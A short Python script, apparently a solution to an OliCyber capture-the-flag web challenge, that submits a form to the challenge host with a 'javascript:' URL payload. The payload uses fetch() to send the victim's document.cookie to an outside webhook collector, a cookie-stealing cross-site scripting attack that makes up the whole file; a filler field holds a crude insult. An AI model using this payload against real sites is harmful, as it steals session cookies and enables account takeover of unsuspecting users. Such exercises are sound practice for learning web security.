import requests

url = "http://proposte.challs.olicyber.it/altro"

payload = "javascript:fetch('https://webhooksite.net/YOUR-ID/?c='+document.cookie)"

requests.post(url, data={"text":"your_mother_so_fat_she_doen't_fit_here", "url":payload})